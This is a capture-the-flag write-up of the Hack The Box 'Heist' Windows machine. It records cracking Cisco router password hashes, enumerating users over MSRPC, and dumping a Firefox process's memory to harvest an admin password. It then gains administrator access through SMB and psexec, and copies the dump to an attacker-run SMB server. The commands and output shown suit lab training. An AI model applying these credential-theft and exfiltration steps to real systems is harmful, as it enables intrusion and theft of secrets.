# Heist-walktrough
A writeup about the htb Heist box
## Enumeration
I use masscan and nmap for a quick scan, here i use a script which create a keepnote page report from the scan, found it [here](https://github.com/roughiz/scautofire).
 
In my first enumeration we can see, ftp and smb share, also http  (80,8080) ports :
```
$ create_SemiNoteFromIpWithMasscan.sh 10.10.10.149  /path/keepnote/Lab/htb  Heist  tun0
...

PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
| http-cookie-flags: 
| /: 
| PHPSESSID: 
|_ httponly flag not set
| http-methods: 
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open msrpc Microsoft Windows RPC
445/tcp open microsoft-ds?
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
Here we have an http site in port 80, smb and also port 5985 WinRm (it's like ssh for windows that users from group Windows Remote Management can use)

## Enumeration 
In the Home page we have a redirection to the login.php page, and we can authenticate as guest by clicking in the button "Login AS Guest" and the request redirect me to the page http://10.10.10.149/issues.php.
![issue](https://github.com/roughiz/Heist-walktrough/blob/master/issue.png)
We have some informations about config issues in a cisco router posted by a user "Hazard" and also a file with cisco config. In this file we have some hashes, so let's crack . 

## Username 
Hazard

## Hashes : 
We have two cisco hashes of type 7 (0242114b0e143f015f5d1e161713/02375012182c1a1d751618034f36415408)
And a cisco hash of type 5 : $1$pdQG$o8nrSzsGXeaduXrjlvKc91

### From config.txt 
```
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

I found a [site](https://www.frameip.com/decrypter-dechiffrer-cracker-password-cisco-7/) where we can crack this type of cisco hash:

###### Q4)sJu\Y8qz*A3?d ( admin)
###### $uperP@ssword (rout3r)

And i crack the cisco hash type 5 with john 

Firstly we store it into a file :
```
$ cat hash 
admin:$1$pdQG$o8nrSzsGXeaduXrjlvKc91
```
And we use john with rockyou dictionary like :
```
$ john   --wordlist=rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:27 17,13% (ETA: 15:30:13) 0g/s 98444p/s 98444c/s 98444C/s xhet17..xhaferi5
0g 0:00:00:29 18,55% (ETA: 15:30:12) 0g/s 98395p/s 98395c/s 98395C/s viperusa95..viper1980
stealth1agent    (admin)
```
###### stealth1agent    (admin)
Now we have many creds, let's try to authenticate with theses creds :
For smb we have the couple (hazard/stealth1agent)
```
$ smbmap -u hazard -p stealth1agent   -H 10.10.10.149
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: 10.10.10.149 
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                                  NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
```
Perhaps this couple of creds works with WinRm, i tried all couple of my 3 passwords and usernames, but it dosen't works , so after many search i found an impacket script which enumerate users through "MSRPC" interface :
```
$ lookupsid.py   Heist.htb/hazard:stealth1agent@10.10.10.149
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```
Here we have a new users let's try theses new users with WinRM script.
Finally the creds works for :

###### Q4)sJu\Y8qz*A3?d (chase)

Now i'm in the box as chase, i have to enumerate for priv esc : 
![User-flag](https://github.com/roughiz/Heist-walktrough/blob/master/userflag.png)

## Priv Esca :
I found this file with PowerUp.ps1 , but it appears that creator has update the box and remove the passwords into (i was late :) )
```
$ cat C:\Windows\Panther\Unattend.xml
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>*SENSITIVE*DATA*DELETED*</Password>
     <Enabled>true</Enabled> 
     <Username>Administrator</Username> 
    </AutoLogon>
```
With ps command we see a strange process "firefox.exe", and with "netstat -ano" we see that firefox.exe client is connected to localhsot , surelly connect to the local site , so let's try to dump this process memory.
![ps-command](https://github.com/roughiz/Heist-walktrough/blob/master/ps.png)
![netstat](https://github.com/roughiz/Heist-walktrough/blob/master/netstat.png)

I used the function "Out-Minidump" from [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) like :
```
$ . .\PowerUp.ps1
$ Out-Minidump -Process (Get-Process -Id 6156)  # id caught from ps 
```
![dump](https://github.com/roughiz/Heist-walktrough/blob/master/dump.png)

And in my box, grep the file like: 
```
$ strings firefox_6156.dmp  |  grep -Fi "password=" | grep -i "admin"
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```
![adminpass](https://github.com/roughiz/Heist-walktrough/blob/master/adminpass.png)
Here the user use the client firefox and send the http request to authenticate into the web app and we can caught the authentication info as :

###### 4dD!5}x/re8]FBuZ (admin@support.htb)
 
lets try theses creds  with smbmap like :
```
$  smbmap -uadministrator   -p '4dD!5}x/re8]FBuZ' -H 10.10.10.149
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: Heist.htb 
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                                  READ, WRITE
	C$                                                	READ, WRITE
	IPC$                                              	READ ONLY

```
Ok creds work great, now i tried three ways to have my flag: 

#### From output with smb 
```
$ smbclient  //10.10.10.149/C$ -Uadministrator
...
get root.txt
$ echo $(cat root.txt ) | wc -c
33
```
![flagroot](https://github.com/roughiz/Heist-walktrough/blob/master/flagrootsmb.png)
#### From the box with the admin share

```
$ net use r: \\SupportDesk\C$ /u:administrator "4dD!5}x/re8]FBuZ"
$ r:
```
![flagrootlocally](https://github.com/roughiz/Heist-walktrough/blob/master/flagrootlocally.png)
#### From output With psexec.ps(Impacket)
```
$ psexec.py SupportDesk/Administrator@10.10.10.149 -service-name LUALL.exe
```
 ![flagrootpsexec](https://github.com/roughiz/Heist-walktrough/blob/master/psexec.png)
### Nota : 
- My winRm ruby script dosen't work for this box , i tried an other simple [script](https://alionder.net/winrm-shell/). (don't know why!!)

- I used smbserver.py from Impacket to exfiltrate the dump.
Firstly we have to launch the smb server with credentials like :
```
$ sudo smbserver.py share $(pwd) -smb2support -username df -password df
```
And in the windows box we first authenticate to the server, and copy the file like :
```
$ net use \\10.10.14.4\share /u:df df 
$ copy mozilla_dump** \\10.10.14.4\share\
```
 




